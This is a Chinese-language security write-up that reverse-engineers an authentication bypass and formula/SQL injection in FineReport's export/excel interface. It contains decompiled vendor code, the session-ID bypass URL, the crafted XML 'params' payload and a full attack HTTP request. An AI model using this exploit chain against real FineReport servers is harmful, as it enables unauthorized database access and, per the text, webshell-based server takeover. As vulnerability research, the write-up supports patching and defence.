# 帆软export/excel SQL注入分析



## 漏洞概述



帆软报表（FineReport） 源于对 export/excel 接口传入的参数没有严格校验，攻击者可构造恶意的 SQL 语句上传 Webshell 实现远程代码执行，进而获取服务器权限。



## 漏洞影响范围



 



受影响的产品版本：



  



* FineReport < 11.5.4.1FineBi 7.0.* < 7.0.5

* FineBi 6.1.* < 6.1.8

* FineBi 6.0.* < 6.0.24

* FineDataLink 5.0.* < 5.0.4.3

* FineDataLink 4.0.* < 4.2.11.3



​



这里主包也是下载了11.5.4 finereport的历史版本开始狠狠地一波分析。



## 鉴权绕过分析



 



帆软的请求在到达实际业务代码前，会经过多个Interceptor的校验



 



![](./assets/6066956430810671325)





 



其中`DecisionInterceptor`实现了对模板的鉴权操作：



 



![](./assets/900829682272861295)





 



在`DecisionInterceptor`中会对请求经过多次检查，检查的List如下



 



![](./assets/5274596954548416821)





在 `getRequestChecker`方法中会根据不同Checker调用不同的校验逻辑，例如在 `com.fr.decision.webservice.interceptor.handler.ReportTemplateRequestChecker#acceptRequest`的校验逻辑如下：![](./assets/7606540115522895325)





### 条件1. 通过acceptRequest——请求含有指定的参数



 



如果对应checker的 `acceptRequest`返回了true，则会进入checkRequest函数中，对模板权限进行校验，而返回true的条件主要由getTemplateId控制，这个函数中最终会检查请求是否包含指定的请求参数，举个栗子，如果调用的函数所在类为 `ReportTemplateRequestChecker`，其中检查的就是是否包含以下几个参数 `viewlet`、 `reportlet`、 `formlet`、 `reportlets`，至于打exp时要选择哪一个得往后再看看。



 





 





```java

    public boolean acceptRequest(HttpServletRequest var1, HandlerMethod var2) {
        TemplateAuth var3 = (TemplateAuth)var2.getMethod().getAnnotation(TemplateAuth.class);
        return var3 != null && var3.product() == TemplateProductType.FINE_REPORT && StringUtils.isNotEmpty(this.getTemplateId(var1, var2));
    }
    
    public String getTemplateId(HttpServletRequest var1, HandlerMethod var2) {
        return TemplateParser.analyzeTemplateID(var1);
    }
    
    public static String analyzeTemplateID(HttpServletRequest var0) {
        String var1 = NetworkHelper.getHTTPRequestParameter(var0, "viewlet");
        if (var1 == null) {
            var1 = NetworkHelper.getHTTPRequestParameter(var0, "reportlet");
        }

        if (var1 == null) {
            var1 = NetworkHelper.getHTTPRequestParameter(var0, "formlet");
        }

        if (var1 == null) {
            var1 = NetworkHelper.getHTTPRequestParameter(var0, "reportlets");
        }

        return var1;
    }

```



总之只要请求中包含的参数满足特定的Checker就会被放行。这里获取sessionId有两种办法。



### 条件2. 令getTempAuthValidatorStatus包含null值——利用checkTemplateAuthority缺陷



 



第一种是进入 `ReportTemplateRequestChecker`类的检查逻辑，我们需要满足传递请求中包含 `reportlets`参数，此时就会进入 `com.fr.decision.webservice.interceptor.handler.ReportTemplateRequestChecker#checkRequest`进行权限判断。我们需要设法让 `checkRequest`返回true，在这个函数中我们能控制请求参数，也就是 `HttpServletRequest var1`中的部分字段，通过调试发现 `getTempAuthValidatorStatus`如果返回了包含null的元素，那么整个checkRequest便会返回true，而 `getTempAuthValidatorStatus`的传入参数可控。var6就是传入的参数值。![](./assets/6102130908631534848)





 



跟进 `getTempAuthValidatorStatus`：



 







```java

    List<TempAuthValidatorStatus> getTempAuthValidatorStatus(HttpServletRequest var1, String var2, int var3) throws Exception {
        ArrayList var4 = new ArrayList();
        if (this.isMultiTemplatePath(var2)) {
            String[] var5 = this.getTemplateFromBookPath(var2);

            for(int var6 = 0; var6 < var5.length; ++var6) {
                String var7 = this.getTemplateInfo(var2, var6);
                # 我们需要设法让var4去add一个null的玩意儿！
                var4.add(this.getTempAuthStatus(var1, var5[var6], var3, var7));
            }
        } else {
            # 我们需要设法让var4去add一个null的玩意儿！
            var4.add(this.getTempAuthStatus(var1, var2, var3));
        }

        return var4;
    }
    
    boolean isMultiTemplatePath(String var1) {
        return var1.startsWith("[") && var1.endsWith("]");
    }

    String[] getTemplateFromBookPath(String var1) {
        if (!this.isMultiTemplatePath(var1)) {
            return new String[]{var1};
        } else {
            JSONArray var2 = (JSONArray)JSONFactory.createJSON(JSON.ARRAY, var1);
            String[] var3 = new String[var2.size()];

            for(int var4 = 0; var4 < var2.size(); ++var4) {
                JSONObject var5 = var2.getJSONObject(var4);
                var3[var4] = var5.getString("reportlet");
            }

            return var3;
        }
    }


```



这里会对我们在请求中传入的的templateId进行判断



  



 如果参数是json数组，例如 `[{"reportlet": "1.cpt"}]`，则使用 `getTemplateFromBookPath`将其中的json value解析出来，然后调用 `getTempAuthStatus`获取对应的模板的认证信息。 



 



 否则的话直接调用 `getTempAuthStatus`获取对应的模板的认证信息。 



  



由于模板名称 `templateId`我们可控，这里的关键问题就是：我们要怎么传入什么值才能让 `getTempAuthStatus`返回null？我们跟进 `getTempAuthStatus`：



 



![](./assets/744238021734548880)





 



发现需要让 `this.detectTemplateNeedAuthenticate(var1, var2)`返回 `false`，函数便会返回null，跟进 `detectTemplateNeedAuthenticate`：



 



![](./assets/980122712022322338)





 



这里将传入的模板名称去除特殊符号后，使用 `/`进行分割，然后将 `HttpServletRequest`对象var1、分割后的模板名称列表var2、列表长度var3传入 `checkTemplateAuthority`判断模板是否需要鉴权，跟进查看：



 



![](./assets/7928303969796606562)





 



 `getTemplateAuthorityValue`的作用就是获取特定模板名称的权限信息，如果我们传入不存在的模板就会返回null，但这个并不是重点纵观整个函数，想要 `getTemplateAuthorityValue`返回false只需要达成其中任意一个条件：



  



 我们传入的模板名称，在递归解析时，某个模板或者路径的 `AuthorityValue`是 `REJECT`，但我们无法控制这个条件 

  `this.checkTemplateAuthority("reportlets", var2, var3 - 1)`返回false，但是 `reportlets`目录的 `AuthorityValue`是 `ACCEPT`，这里返回恒定为 `true` 

  `if`条件中没有达成return条件，默认返回false。要想达成这一点，我们需要让var4为null，这里我们只需要传入不存在的模板名称即可。然后进入else分支，这里递归对的条件为 `var3>=1`，如果 `var3==0`那么在else分支中也无法进入return的分支，最终返回false。 



因此问题就变为了，如何让 `var3==0`，var3其实就是在上一个函数 `detectTemplateNeedAuthenticate`对模板名称使用 `/`分割后的字符串数组长度，因此很容易联想到传入 `/`，经过分割后，字符串长度即为0，这里就有两种方法：



 直接传入 `/webroot/decision/view/report?reportlets=/` 

 由于 `getTempAuthValidatorStatus`会使用 `getTemplateFromBookPath`解析json值，并获取json中的 `reportlet`值，因此我们还可以传入 `/webroot/decision/view/report?reportlets=[{'reportlet':'/'}]`的方式绕过 



​



 这样一来，在 `com.fr.decision.webservice.interceptor.handler.ReportTemplateRequestChecker#checkRequest`的鉴权中， `getTempAuthValidatorStatus`返回了包含null的列表：



 



![](./assets/1910389357483008920)





 



然后 `DecisionInterceptor`就返回了true，而且没有被设置为401未授权



 



![](./assets/3518455500960442381)





 



![](./assets/5009522066828953084)





 



最终我们便通过了鉴权Interceptor的校验



## 获取sessionId



 



在经过鉴权后，最终会来到 `com.fr.web.core.ReportDispatcher#dealWithRequest处理请求`



 



![](./assets/787111029786671605)





### 条件3. 设置op=getSessionID



 



在函数中会尝试获取两个请求参数 `op`和 `sessionID`，如果我们只传递 `op=getSessionID`，在经过一些列校验后，我们就可以获取到一个合法的模板sessionId了！



### 条件4. 设法进入GroupReportletCreator



 



但问题是如何通过校验，我们可以看到，在代码中：



 





```plain

if ("getSessionID".equalsIgnoreCase(var2)) {
    if (var3 == null) {
        var3 = SessionPoolManager.generateSessionIDWithCheckRegister(var0, var1);
    }

    SessionPoolManager.responseSessionID(var3, var0, var1);

```



是在 `SessionPoolManager.generateSessionIDWithCheckRegister(var0, var1);`中生成sessionID的，跟进去看看：



 



![](./assets/3161168665693310541)





 



在generateSessionIDWithCheckRegister->generateSessionID中，需要保证 `WebletFactory.createWebletByRequest(var0, var1);`返回值不为null，关键点就在createWebletByRequest中，createWebletByRequest会从 `webletCreatorList`中遍历其中预先设置好的 `weblet`，如果我们传递的请求参数命中了对应weblet的 `match`函数中的逻辑，则会返回这个webletCreator，否则返回null：



 



![](./assets/9089162067631418665)





 



其中总共有8个webletCreator，在 `var4.queryPath`函数中，每个Creator会尝试获取指定名称的请求参数，并且请求参数值是否命中 `match`函数所以为了过这个判断，我们需要看看哪些参数是合法的，以便我们能通过校验：



 



![](./assets/3792649458423996869)





 



而在match函数中会对请求参数的后缀或者特定格式进行判断，用于进入不同的WebletCreator



 



![](./assets/5769820251834761302)





 



通过调试，可知9个Creator关注的请求参数以及match的条件为：



  `com.fr.nx.app.web.StreamReportletCreator`:  



 请求参数： `viewlet`,   `reportlet` 

* match条件：后缀为cptx



1. com.fr.nx.app.web.StreamAndTemplateReportletCreator





 请求参数： `viewlet`,   `reportlet` 

* match条件：后缀为cpt



1. com.fr.web.reportlet.ReportletCreator





 请求参数： `viewlet`,   `reportlet` 

* match条件：后缀为cpt



1. com.fr.web.reportlet.ClassReportletCreator





 请求参数： `viewlet`,   `reportlet` 

* match条件：任意后缀



1. com.fr.web.reportlet.GroupReportletCreator





 请求参数： `viewlets`,   `reportlets` 

 match条件： `var1.startsWith("[") && var1.endsWith("]");` 



1. com.fr.web.reportlet.ClassGroupReportletCreator





 请求参数： `viewlets`,   `reportlets` 

* match条件：任意后缀



1. com.fr.web.weblet.FormletCreator





 请求参数： `viewlet`,   `formlet` 

* match条件: frm或者form后缀



1. com.fr.web.weblet.ClassFormletCreator





 请求参数： `viewlet`,   `formlet` 

* match条件：任意后缀



1. com.fr.plugin.wysiwyg.web.weblet.DuchampletCreator





 请求参数： `viewlet` 

* match条件: fvs后缀



由于一开始我们为了绕过 `DecisionInterceptor`，将请求参数设置为了 `/`或者 `[{'reportlet':'/'}]`，所以这里只有以下几个请求参数名称与值的组合是可用的：



  `viewlets=[{'reportlet':'/'}]`和  `reportlets=[{'reportlet':'/'}]`，命中 `com.fr.web.reportlet.GroupReportletCreator` 

  `reportlets=/`， `reportlets=/`， `reportlet=/`，  `viewlet=/`， `formlet=/` 



  



但这仅仅是能够进入 `if (var4.match(var4.queryPath(var0).getPath()))`的前提，进入if分之后，会调用对应WebletCreator实例的 `createWebletByRequest`，但大部分的Creator没有在本类中实现 `createWebletByRequest`，于是会转而调用其父类 `AbstractClassReportletCreator#createWebletByRequest`



 



 `com.fr.web.reportlet.AbstractClassReportletCreator#createWebletByRequest#createWebletByRequest`





```java

    public Weblet createWebletByRequest(HttpServletRequest var1, HttpServletResponse var2) {
        String var3 = this.queryPath(var1).getPath();
        Object var4 = null;
        if (this.checkReportServlet(var1)) {
            return this.createOldWeblet(var3);
        } else {
            try {
                var4 = GeneralUtils.classForName(var3).newInstance();
            } catch (Exception var6) {
            }

            return var4 instanceof Reportlet ? new WebClassReportlet(var3, (Reportlet)var4) : null;
        }
    }

```



这就产生了一个问题，如果我们一开始传入的是 `reportlets=/`，那么 `this.checkReportServlet(var1)`便一定是false，因为实际上不存在名为 `/`的reportlet，转到else分之后，代码会试图将我们的请求参数视为一个类名去反射实例化，但这一步肯定会失败，于是最终 `WebletFactory.createWebletByRequest(var0, var1)`会返回null，这就导致了其返回值送到 `generateSessionID`时会抛出异常：



 



![](./assets/5421315800781189056)





 



那难道就没办法了吗？有的兄弟, 有的，虽然说9个 `Creator`里面有8个使用了父类的 `createWebletByRequest`，但是剩下的一个 `com.fr.web.reportlet.GroupReportletCreator#createWebletByRequest`重载了父类的 `createWebletByRequest`并且还有点说法：



 



![](./assets/1699510896149159000)





 



在这里了我们只需要让请求参数中出现 `op=getSessionID`即可让 `createWebletByRequest`返回非空值！



 



![](./assets/7894501054156339656)





 



堆栈信息为：



 





```plain

at com.fr.web.core.ReportDispatcher.dealWithRequest(ReportDispatcher.java:243)
at com.fr.web.controller.BaseRequestService.handleRequest(BaseRequestService.java:40)
at com.fr.web.controller.AbstractRequestService.handle(AbstractRequestService.java:49)
at com.fr.web.controller.AbstractRequestService.handle(AbstractRequestService.java:28)
at com.fr.web.controller.ReportRequestService.preview(ReportRequestService.java:28)
at sun.reflect.GeneratedMethodAccessor361.invoke(Unknown Source:-1)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:498)
at com.fr.third.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
at com.fr.third.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133)
at com.fr.third.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97)
at com.fr.third.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:854)
at com.fr.third.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:765)
at com.fr.third.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85)
at com.fr.third.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)
at com.fr.decision.webservice.servlet.FineDispatcherServlet.doDispatch(FineDispatcherServlet.java:30)
at com.fr.third.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)
at com.fr.third.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)
at com.fr.third.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:529)
at com.fr.third.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:199)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.decision.webservice.BackupActivator$1.doFilter(BackupActivator.java:77)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.decision.webservice.filter.TenantFilter.doFilter(TenantFilter.java:55)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.decision.base.DecisionServletInitializer$6.doFilterInternal(DecisionServletInitializer.java:269)
at com.fr.third.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.decision.base.VirtualFilterChain.doFilter(VirtualFilterChain.java:34)
at com.fr.decision.base.DecisionServletInitializer$4.doFilter(DecisionServletInitializer.java:201)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.decision.webservice.filter.EncryptionLevelFilterSupport.doFilterInternal(EncryptionLevelFilterSupport.java:39)
at com.fr.decision.webservice.filter.EncryptionLevelFilter.doFilterInternal(EncryptionLevelFilter.java:29)
at com.fr.third.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.plugin.mobile.web.server.single.login.filter.Html5SingleLoginFilter.doFilter(Unknown Source:-1)
at com.fr.decision.base.DecisionServletInitializer$5.doFilter(DecisionServletInitializer.java:230)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.plugin.system.operation.ops.filter.OpsIgnoreFilter$VirtualFilterChain.doFilter(Unknown Source:-1)
at com.fr.plugin.system.operation.ops.filter.impl.OpsFilter.doFilter(Unknown Source:-1)
at com.fr.plugin.system.operation.ops.filter.OpsIgnoreFilter$VirtualFilterChain.doFilter(Unknown Source:-1)
at com.fr.plugin.system.operation.ops.filter.OpsIgnoreFilter.doFilter(Unknown Source:-1)
at com.fr.decision.base.DecisionServletInitializer$5.doFilter(DecisionServletInitializer.java:230)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.decision.webservice.filter.SecurityRefererFilter.doFilter(SecurityRefererFilter.java:66)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.decision.webservice.filter.URICheckFilter.doFilterInternal(URICheckFilter.java:39)
at com.fr.third.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.decision.webservice.filter.CookieCheckFilter.doFilterInternal(CookieCheckFilter.java:37)
at com.fr.third.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at com.fr.third.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:197)
at com.fr.third.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:168)
at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482)
at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)
at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)
at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:397)
at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:935)
at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1826)
at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)
at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)
at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
at java.lang.Thread.run(Thread.java:748)

```



### 联立上述条件



 



于是我们回顾一下整个payload的约束条件



  



 条件一：请求参数中包含 `viewlet`、 `reportlet`、 `formlet`、 `reportlets`等硬编码请求参数 

 条件二：传入请求参数内容为 `/`或者 `[{'reportlet':'/'}]` 

 条件三：包含参数 `op=getSessionID` 

 条件四：使用 `com.fr.web.reportlet.GroupReportletCreator`，需要请求参数为 `viewlets`或 `reportlets`，且参数内容以 `[`开头，以 `]`结尾 



  



上述四个条件需要同时满足，因此最终的payload为：



 





```plain

/webroot/decision/view/report?op=getSessionID&reportlets=[{'reportlet':'/'}]

```



当然参数不一定为 `reportlets`， `viewlets`也可以



 



![](./assets/3957760017642763388)





## 执行任意Formula表达式



 



根据情报披露，存在漏洞的路由为 `export/excel`，通过全局搜索发现如下接口：



 



![](./assets/2852089252273313089)





 



对应的handle为 `com.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetExcelExportHandler#doHandle`，由于我们之前获取的sessionId是绕过鉴权的，而导出接口的鉴权验证是通过验证sessionId是否需要鉴权，在验证的过程中等同于走了与前面相同的鉴权绕过逻辑，因此此时导出excel也是无需认证信息的。



 



![](./assets/5017035898480291392)





 



在doHandle中



 





```plain

TemplateSessionIDInfo var4 = (TemplateSessionIDInfo)SessionPoolManager.getSessionIDInfor(var3, TemplateSessionIDInfo.class);
Calculator var5 = this.getCalculatorFromPara(var1, var2, var3);

```



其实就是根据sessionId获取模板信息，同时初始化一个 `Calculator`，这里的 `Calculator`是帆软自己实现的一套表达式计算工具类，后面有大用



 



我们逐步调试，首先跟进 `com.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetExcelExportHandler#initCreator`



 





```java

    private WorkbookDataCreator initCreator(Calculator var1, HttpServletRequest var2, HttpServletResponse var3, TemplateSessionIDInfo var4) throws Exception {
        // 解析请求包中的__parameters__参数
        String var5 = WebUtils.getHTTPRequestParameter(var2, "__parameters__");
        Map var6 = this.getParamsMap(var5);
        // 解析请求包中的params参数
        LargeDatasetExcelExportJavaScript var7 = this.getEntity(var2);
        String var8 = var7.getFileName();
        String var9 = var7.getDsName();
        LinkedHashMap var10 = var7.getColNamesMap();
        DirectExcelExportModel var11 = new DirectExcelExportModel();
        TableDataSource var12 = var4.getTableDataSource();
        if (StringUtils.isNotEmpty(var8) && var8.startsWith("=$")) {
            var8 = (String)var6.get("__filename__");
        }

        if (StringUtils.isEmpty(var8)) {
            var8 = getDefaultFileName(var2, var4, var9);
        } else if (var8.endsWith(".xlsx")) {
            var8 = var8.substring(0, var8.lastIndexOf(".xlsx"));
        }

        this.setRes(var3, Browser.resolve(var2).getEncodedFileName4Download(var8));
        var11.setDataSource(var12);
        var11.setSessionID(var4.getSessionID());
        if (StringUtils.isEmpty(var9)) {
            throw new Exception("No datasource name specified for exportation.");
        } else {
            var11.setDsName(var9);
            this.dealParam(var11, var1, var7, var2, var4, var6);
            if (!var10.isEmpty()) {
                var11.setColNamesMap(var10);
            }

            return WorkbookDataCreator.build(var11);
        }
    }

```



initCreator首先获取请求包中的 `__parameters__`参数，之后会将其json反序列化，但这玩意没什么卵用，随后进入 `getEntity`，这玩意会返回包含数据集、文件名等信息在内的类 `LargeDatasetExcelExportJavaScript`，我们跟进查看一下：



 



![](./assets/5960787073294203361)





 



在这里会获取请求包中的 `params`参数，并使用xml进行解析，由于 `getHTTPRequestParameter`会从query、header、body、cookie等位置获取参数，所以params可以出现在上面的任意一个位置。接下来的关键是params xml的结构是什么。在代码我们可以知道， `var4.readXMLObject`的参数是 `LargeDatasetExcelExportJavaScript`类的实例，我们跟进 `readXMLObject`：



 



![](./assets/4486465129470971406)





 



这是一个使用了DFS实现的xml解析算法，其中会使用传入参数的 `xmlObject.readXML`去读取对象，这里的xmlObject就是 `LargeDatasetExcelExportJavaScript`的类型，所以我们直接看 `LargeDatasetExcelExportJavaScript`中 `readXML`的实现：



 





```java

    public void readXML(XMLableReader var1) {
        super.readXML(var1);
        if (var1.isChildNode()) {
            String var2 = var1.getTagName();
            if ("LargeDatasetExcelExportJS".equals(var2)) {
                this.setFileName(var1.getAttrAsString("exportFileName", ""));
                this.setDsName(var1.getAttrAsString("dsName", ""));
                String var3 = var1.getAttrAsString("colNames", "");
                LinkedHashMap var4 = (LinkedHashMap)((JSONObject)JSONFactory.createJSON(JSON.OBJECT, var3)).getMap();

                for(Map.Entry var6 : var4.entrySet()) {
                    if (!(var6.getValue() instanceof String)) {
                        var6.setValue(var6.getValue().toString());
                    }
                }

                this.setColNamesMap(var4);
            }
        }

    }

```



不难知道，xml中需要包含 `LargeDatasetExcelExportJS`标签，其中需要有如下属性



  



* exportFileName



 



* dsName



 



* colNames



  



例如这样



 





```xml

<LargeDatasetExcelExportJS exportFileName="waibiwaibi" dsName="ds1" colNames="{}" exportFormat="excel" encodeFormat="UTF-8"/>

```



但值得注意的是在 `com.fr.nx.app.web.handler.export.largeds.bean.LargeDatasetExcelExportJavaScript#readXML`的第一行便调用了 `super.readXML(var1);`，跟进查看：



 





```java

    public void readXML(XMLableReader var1) {
        if (var1.isChildNode() && "Parameters".equals(var1.getTagName())) {
            Parameter[] var2 = BaseXMLUtils.readParameters(var1);
            this.setParameters(var2);
        }

    }

```



这里检测到有 `Parameters`标签后会进入 `readParameters`读取参数，进去看看：



 



![](./assets/1692186619410287553)





 



又是dfs处理xml结构，但是这里又有一个 `readXMLObject`来处理，处理的对象是 `Parameter`类，所以我们直接看看这个类中的 `readXML`方法便可以知道 `Parameter`xml标签的结构了：



 





 





```java

    public void readXML(XMLableReader var1) {
        if (var1.isChildNode()) {
            String var3 = var1.getTagName();
            if (!"Object".equals(var3) && !"O".equals(var3)) {
                String var2;
                if ("Attributes".equals(var3) && (var2 = var1.getAttrAsString("name", (String)null)) != null) {
                    this.setName(var2);
                }
            } else {
                Object var4 = GeneralXMLTools.readObject(var1);
                this.setValue(var4);
            }
        }

    }

```





 





```java

    public static Object readObject(XMLableReader var0) {
        return readObject(var0, false);
    }

    public static Object readObject(XMLableReader var0, boolean var1) {
        String var2 = "String";
        String var3;
        if ((var3 = var0.getAttrAsString("t", (String)null)) != null) {
            var2 = var3;
        }

        return Object_Tokenizer.tokenizerObject(var0, var1, var2, (ThreadLocal)null);
    }

```



从这个代码可以推测 `Parameter`的结构类似于：



 





```xml

<Parameter>
    <Attributes name="p1"></Attributes>
    <Object t="xxxx"></Object>
</Parameter>


```



但重要的是，在 `com.fr.general.xml.GeneralXMLTools.readObject`，进入了 `Object_Tokenizer.tokenizerObject`实例化了某个东西，直觉告诉我们和 `readObject`沾边的玩意都不是什么好玩意儿，进去看看：



 



![](./assets/2175504815288906627)





 



乍一看平平无奇，似乎是设置单元格属性的，但是调用了父类的 `super.tokenizerObject(var1, var2, var3, var4);`，进去看看：



 



![](./assets/6808299234880267444)





 



这里定义了一坨东西，似乎是告诉解析器 `<Object>`标签需要实例化的类是什么类型的，那么前面 `t="xxx"`中的t就是其中的某一个类型。这里的作用先按下不表：



 



总之在处理完xml之后，回到 `com.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetExcelExportHandler#initCreator`



 



![](./assets/8537502092202432050)





 



然后最终会到 `com.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetExcelExportHandler#dealParam`，这个函数有什么特别之处呢？这里满足特定条件，会将我们的可控参数送到 `com.fr.script.Calculator#evalValue(java.lang.String)`中去处理，而这个函数正式帆软的表达式执行函数，我们可以参考 `/view/ReportServer`漏洞，利用其执行 `sql(...)`函数去RCE！但进入这些if分支的条件是什么？我们一步步看：



  



 首先请求体中要有 `functionParams`参数，并且是json格式的 

  `LargeDatasetExcelExportJavaScript var3`必须有 `Parameter`，也就是请求体params参数的xml中要有 `<Parameters>...</Parameters>`标签。 

  `var19`为 `null`，这里我们只需要传入的 `functionParams`为空json `{}`即可 

  `var17.getValue()`需要为 `Formula`类型，这里的 `var17.getValue()`就是前面 `<Object t="xxxx"></Object>`中 `t`指定的对象类型 



  



有了这些条件payload呼之欲出：



 





```xml

<R>
    <LargeDatasetExcelExportJS exportFileName="waibiwaibi" dsName="ds1" colNames="{}" exportFormat="excel" encodeFormat="UTF-8"/>
    <Parameters>
        <Parameter>
            <Attributes name="p1"></Attributes>
            <Object t="Formula"></Object>
        </Parameter>
    </Parameters>
</R>

```



但不应该是表达式注入吗？注入的表达式在哪里？这里我们就需要回头看 `com.fr.base.BaseObjectTokenizer#tokenizerObject`![](./assets/744595205361020401)





 



在这里， `var3`就是 `<Object t="xxx">`中的 `t`属性，当 `t`为 `Formula`时进入 `com.fr.base.BaseObjectTokenizer#getFormula`：



 



![](./assets/4205922548836896126)





 



这里 `var1`的类型为 `BaseFormula`，他的 `readXML`为：



 



![](./assets/712591762781898568)





 



我们看到会读取 `Attributes`标签，并将标签内容设置为 `BaseFormula`对象的 `Content`值，于是最终的payload为：



 





```xml

<R>
    <LargeDatasetExcelExportJS exportFileName="waibiwaibi" dsName="ds1" colNames="{}" exportFormat="excel" encodeFormat="UTF-8"/>
    <Parameters>
        <Parameter>
            <Attributes name="p1"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo', DECODE('%77%61%69%62%69%77%61%69%62%69'), 1, 1)</Attributes>
            </Object>
        </Parameter>
    </Parameters>
</R>

```



注意sessionId有过期时间，每次打都要重新获取sessionId；这里使用的 `DECODE`函数，需要将SQL语句双重url编码, 完整的请求包就是：



 





```plain

GET /webroot/decision/nx/report/v9/largedataset/export/excel HTTP/1.1
Host: 192.168.197.130:8075
User-Agent: Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Tablet/15E148 Safari/604.1
Upgrade-Insecure-Requests: 1
sessionID: f2b058a8-a1be-4403-976c-00b1fc96664a
params: <R><LargeDatasetExcelExportJS exportFileName="waibiwaibi" dsName="ds1" colNames="{}" exportFormat="excel" encodeFormat="UTF-8"/><Parameters><Parameter><Attributes name="p1"></Attributes><Object t="Formula"><Attributes>sql('FRDemo', DECODE('%2573%2565%256c%2565%2563%2574%2520%2527%2577%2561%2569%2562%2569%2577%2561%2569%2562%2569%2527'),1,1)</Attributes></Object></Parameter></Parameters></R>
__parameters__: {}
functionParams: {}
